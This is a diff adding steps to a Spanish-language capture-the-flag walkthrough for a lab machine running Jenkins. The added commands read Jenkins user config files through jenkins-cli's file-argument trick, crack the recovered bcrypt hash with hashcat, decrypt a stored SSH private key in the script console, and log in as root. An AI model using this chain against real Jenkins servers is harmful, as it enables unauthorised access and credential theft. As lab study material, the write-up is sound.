@@ -166,11 +166,41 @@ docker exec -it great_meitner bash
 ```
 java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/users/users.xml 2>&1 | grep -oP "'.*?'"
 ```
-``
-- Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
-```
-burpsuite &> /dev/null & disown
-```
-- En las configuraciones del proxy editamos en la ip el host de la pagina que vamos a utilizar con el puerto designado
 
-- Nos clonamos 
+- Ahora revisamos la información de Jeniffer para ver el archivo config.xml, Con esto podremos ver una contraseña hasheada.
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml.xml 2>&1 | grep -oP "'.*?'"
+```
+
+- Realizamos lo siguiente para crackiarla, creamos un archivo hash con nvim en la carpeta content, guardamos la contraseña hasheada y usamos la siguiente línea
+```
+hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
+```
+- En esta parte observamos la contraseña de jennifer y nos podemos logear con la contraseña princess
+- Vamos a la parte de **Manaje Jenkins** y buscamos la parte de scripts
+- Ahora si hace **Ctrl + Shift + C** e inspecionamos enconrtamos la **privateKey**
+- Nos copiamos la privateKey y creamos un archivo data guardando la info
+
+- Con el siguiente comando verificamos si esta codificado la información encontrada
+```
+cat data | tr -d '{}' | base64 -d
+```
+
+- Con la siguiente linea podemos decodificar en el script de Jenkins
+```
+println(hudson.util.Secret.decrypt("{}"))
+```
+- Esto mostrara la clave privada
+
+- Creamos un archivo id_rsa con la contraseña privada 
+```
+nvim id_rsa
+```
+- Le otorgamos el permiso 600 `chmod 600 id_rsa`
+
+- Finalmente nos conectamos por ssh para tener acceso a la maquina
+```
+ssh -i id_rsa root@10.10.11.10
+```
+
+- Con esto ya podrian ver la flag root.txt :)
